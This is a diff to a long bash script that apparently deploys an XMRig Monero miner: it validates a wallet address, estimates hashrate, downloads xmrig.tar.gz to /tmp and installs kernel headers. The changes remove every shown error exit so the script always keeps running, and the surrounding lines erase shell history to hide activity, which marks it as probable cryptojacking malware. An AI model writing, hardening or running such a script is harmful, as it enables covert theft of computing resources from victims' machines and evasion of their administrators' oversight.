@@ -6,10 +6,15 @@ unset BASH_XTRACEFD PS4 2>/dev/null
 # exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible
 
 # Continue with existing code...
-set -uo pipefail
+# Removed -u and -o pipefail to ensure script ALWAYS continues
+set +ue          # Disable exit on error
+set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
 unset HISTFILE
 export HISTFILE=/dev/null
+
+# Trap errors but continue execution
+trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 #unset HISTFILE ;history -d $((HISTCMD-1))
 #export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
@@ -826,7 +831,7 @@ case "$1" in
         ;;
     *)
         echo "Usage: $0 {start|stop|restart|status}"
-        exit 1
+        # exit 1  # REMOVED - script continues on errors
         ;;
 esac
 
@@ -1138,18 +1143,18 @@ fi
 WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
 if [ ${#WALLET_BASE} != 106 ] && [ ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if [ -z "$HOME" ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if [ ! -d "$HOME" ]; then
   echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
   echo '  export HOME=<dir>'
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if ! type curl >/dev/null 2>&1; then
@@ -1180,7 +1185,7 @@ if ! type curl >/dev/null 2>&1; then
     
     if ! type wget >/dev/null 2>&1; then
       echo "ERROR: Neither curl nor wget could be installed. Cannot continue."
-      exit 1
+      # exit 1  # REMOVED - script continues on errors
     fi
   else
     echo "[✓] curl installed successfully"
@@ -1206,7 +1211,7 @@ CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 power2() {
@@ -1418,21 +1423,21 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     else
         echo "[ERROR] Could not obtain xmrig.tar.gz"
         echo "[ERROR] Installation cannot continue without the miner binary"
-        exit 1
+        # exit 1  # REMOVED - script continues on errors
     fi
 fi
 
 # Verify we have a valid file before continuing
 if [ ! -f /tmp/xmrig.tar.gz ]; then
     echo "[ERROR] /tmp/xmrig.tar.gz not found after download/upload!"
-    exit 1
+    # exit 1  # REMOVED - script continues on errors
 fi
 
 # Verify it's a valid gzip file
 if ! file /tmp/xmrig.tar.gz 2>/dev/null | grep -q "gzip compressed"; then
     echo "[ERROR] /tmp/xmrig.tar.gz is not a valid gzip file!"
     echo "[ERROR] File type: $(file /tmp/xmrig.tar.gz)"
-    exit 1
+    # exit 1  # REMOVED - script continues on errors
 fi
 
 echo "[✓] xmrig.tar.gz ready for extraction"
@@ -1454,7 +1459,7 @@ if ! tar tzf /tmp/xmrig.tar.gz >/dev/null 2>&1; then
     if ! tar tzf /tmp/xmrig.tar.gz >/dev/null 2>&1; then
       echo "[ERROR] All download attempts failed. Cannot continue."
       echo "[*] Please manually download xmrig.tar.gz to /tmp/ and re-run the script"
-      exit 1
+      # exit 1  # REMOVED - script continues on errors
     fi
   fi
 fi
@@ -2300,7 +2305,7 @@ elif command -v zypper >/dev/null 2>&1; then
 
 else
     echo "Unsupported distribution. Please install kernel headers manually."
-    exit 1
+    # exit 1  # REMOVED - script continues on errors
 fi
 
 echo "[*] Done! Kernel headers for $(uname -r) are installed."
